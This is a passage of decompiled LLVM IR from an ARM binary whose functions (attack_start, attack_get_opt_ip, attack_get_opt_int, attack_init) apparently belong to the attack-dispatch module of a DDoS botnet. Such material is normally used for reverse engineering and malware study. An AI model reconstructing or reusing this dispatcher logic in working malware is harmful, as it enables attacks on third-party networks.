  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_12ad4.31 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_12ad4.31 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_218b0.27 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_218b4.29 to i32), i32* @r6, align 4
  store i32 36588, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_218b1.35 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_218b4.29, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 36588, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 36588, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_218b1.35 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_a088.37 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_218b1.35 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_218b4.29, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_a088.37 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
  %v1_86a0 = trunc i32 %v0_86a0 to i8
  %v2_86a0 = load i32, i32* @r5, align 4
  %v3_86a0 = add i32 %v2_86a0, 4
  %v4_86a0 = inttoptr i32 %v3_86a0 to i8*
  store i8 %v1_86a0, i8* %v4_86a0, align 1
  %v0_86a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_86a4 = mul i32 %v0_86a4, 4
  store i32 %v3_86a4, i32* %r1.global-to-local, align 4
  %v4_86a8 = inttoptr i32 %v2_8698 to i32*
  %v5_86a8 = call i32 @realloc(i32* %v4_86a8, i32 %v3_86a4, i32 %v6_865c, i32 ptrtoint (i32* @global_var_a088.37 to i32))
  %v2_86ac = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_86ac = zext i8 %v2_86ac to i32
  store i32 %v3_86ac, i32* %r3.global-to-local, align 4
  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_a4c0.39 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
